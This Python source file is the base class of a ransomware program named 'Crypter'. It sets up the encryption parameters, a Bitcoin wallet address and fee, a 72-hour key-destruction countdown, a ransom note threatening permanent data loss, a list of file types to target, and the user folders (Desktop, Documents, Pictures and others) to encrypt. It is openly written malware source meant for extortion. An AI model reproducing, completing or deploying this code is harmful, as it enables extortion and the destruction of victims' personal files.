'''
@summary: Crypter: Base class for inheritence
@author: MLS
'''

# Import libs
import os

# Import classes

################
## Base class ##
################
class Base():
    '''
    @summary: Base Class. Defines schema for Crypter
    @todo: Continue with defining GUI schema
    '''

    # CORE SCHEMA
    ENCRYPTED_EXTENSION = ".locked"
    BLOCK_SIZE_BYTES = 8192
    IV_SIZE = 16
    PADDING_BLOCK_SIZE = 16
    MAX_FILE_SIZE_BYTES = 536870912
    KEY_DESTRUCT_TIME_SECONDS = 259200
    REGISTRY_LOCATION = r"SOFTWARE\\Crypter"
    WALLET_ADDRESS = "12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay"
    BITCOIN_FEE = "0.5"
    
    # GUI SCHEMA
    GUI_IMAGE_LOGO = "crypter_logo_small.bmp"
    GUI_IMAGE_TITLE = "crypter_title.bmp"
    GUI_LABEL_TEXT_FLASHING_ENCRYPTED = "YOUR FILES HAVE BEEN ENCRYPTED!"
    GUI_LABEL_TEXT_FLASHING_DECRYPTED = "YOUR FILES HAVE BEEN DECRYPTED!"
    GUI_LABEL_TEXT_KEY_DESTRUCTION = "KEY DESTRUCTION IN: "
    GUI_LABEL_TEXT_WALLET_ADDRESS = "WALLET ADDRESS: "
    GUI_LABEL_TEXT_FILES_DECRYPTED = "FILES DECRYPTED"
    GUI_LABEL_TEXT_KEY_DESTROYED = "KEY DESTROYED"
    GUI_BUTTON_TEXT_VIEW_ENCRYPTED_FILES = "View Encrypted Files"
    GUI_BUTTON_TEXT_ENTER_DECRYPTION_KEY = "Enter Decryption Key"
    GUI_DECRYPTION_DIALOG_LABEL_TEXT_INVALID_KEY = "Invalid Key!"
    GUI_DECRYPTION_DIALOG_LABEL_TEXT_WAITING = "Waiting for input"
    GUI_DECRYPTION_DIALOG_LABEL_TEXT_DECRYPTING = "Decrypting! Please Wait"
    GUI_DECRYPTION_DIALOG_LABEL_TEXT_FINISHED = "Decryption Complete!"
    GUI_ENCRYPTED_FILES_DIALOG_NO_FILES_FOUND = "A list of encrypted files was not found"
    
    GUI_RANSOM_MESSAGE = (
        "The important files on your computer have been encrypted with"
        " military grade AES-256 bit encryption.\n\nYour documents, videos"
        " images and other forms of data are now inaccessible, and cannot"
        " be unlocked without the decryption key. This key is currently"
        " being stored on a remote server.\n\nTo acquire this key, transfer"
        " a total of %s BTC to the Bitcoin wallet address below within %s"
        " hours.\n\nIf you fail to take action within this time window,"
        " the decryption key will be destroyed and access to your files"
        " will be permanently lost." % 
        (BITCOIN_FEE, (KEY_DESTRUCT_TIME_SECONDS / 60 / 60))
        )

    FILETYPES = [
                # GENERAL FORMATS
                "sln",

                # IMAGE FORMATS
                "jpg", "png",

                # VIDEO FORMATS
                "mp4", "avi", "mkv",

                # DOCUMENT FORMATS
                "doc", "docx", "txt", "pdf",

                # SOUND FORMATS
                "mp3",

                # EXE FORMATS
                "exe", "msi", "php",

                # COMPRESSION FORMATS
                "tgz", "zip", "rar"
                ]
    
    
    FILES_TO_EXCLUDE = [
        "key.txt"
        ]
    

    def get_base_dirs(self, home_dir):
      # Function to return a list of base directories to encrypt
      # TODO Detect presence of network drives
      # TODO Improve overall functionality for getting list of locations to encrypt

      base_dirs = [
                    os.path.join(home_dir, "Desktop"),
                    os.path.join(home_dir, "Documents"),
                    os.path.join(home_dir, "Downloads"),
                    os.path.join(home_dir, "Music"),
                    os.path.join(home_dir, "Pictures"),
                    os.path.join(home_dir, "Videos")
                  ]

      return base_dirs

